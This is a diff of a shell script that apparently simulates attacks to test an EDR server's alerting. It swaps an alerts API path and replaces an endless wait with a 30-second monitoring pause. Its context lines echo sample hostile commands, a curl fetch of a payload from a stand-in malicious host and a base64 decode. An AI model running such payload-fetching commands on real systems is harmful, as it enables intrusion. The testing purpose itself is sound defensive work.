@@ -38,8 +38,9 @@ echo "  - curl http://malicious.com/payload.sh"
 echo "  - base64 -d <<< 'malicious_payload'"
 
 echo "🔥 Attack simulation completed!"
-echo "Check EDR Server for alerts: http://localhost:8080/api/v2/alerts"
+echo "Check EDR Server for alerts: http://localhost:8080/api/v1/alerts"
 
-# Keep container running
-tail -f /dev/null
-
+# Keep container running for monitoring
+echo "🔍 Monitoring for 30 seconds..."
+sleep 30
+echo "✅ Attack simulation finished!"
